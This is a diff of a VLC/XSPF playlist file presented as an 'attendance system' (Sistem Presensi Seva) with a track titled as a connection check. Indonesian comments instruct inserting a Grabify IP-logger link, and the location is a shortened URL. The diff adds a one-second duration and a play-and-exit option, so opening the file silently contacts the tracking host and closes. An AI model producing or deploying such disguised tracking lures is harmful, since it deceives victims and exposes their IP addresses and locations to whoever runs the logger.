@@ -1,14 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<playlist xmlns="http://xspf.org" version="1">
+<playlist xmlns="http://www.xspf.org/ns/0/" xmlns:vlc="http://www.videolan.org/vlc/playlist/ns/0/" version="1">
     <title>Sistem Presensi Seva</title>
     <trackList>
         <track>
-            <!-- GANTI LINK DI BAWAH INI DENGAN "NEW URL" DARI GRABIFY -->
+            <!-- MASUKKAN LINK NEW URL DARI GRABIFY DI BAWAH INI -->
             <location>https://urlto.me/2hexg</location>
             <title>Memverifikasi Koneksi Presensi...</title>
-            <extension application="http://videolan.org">
+            <duration>1</duration>
+            <extension application="http://www.videolan.org/vlc/playlist/0">
                 <vlc:id>0</vlc:id>
-                <!-- Mengatur agar VLC tidak loading terlalu lama -->
+                <vlc:option>play-and-exit</vlc:option>
                 <vlc:option>network-caching=100</vlc:option>
             </extension>
         </track>
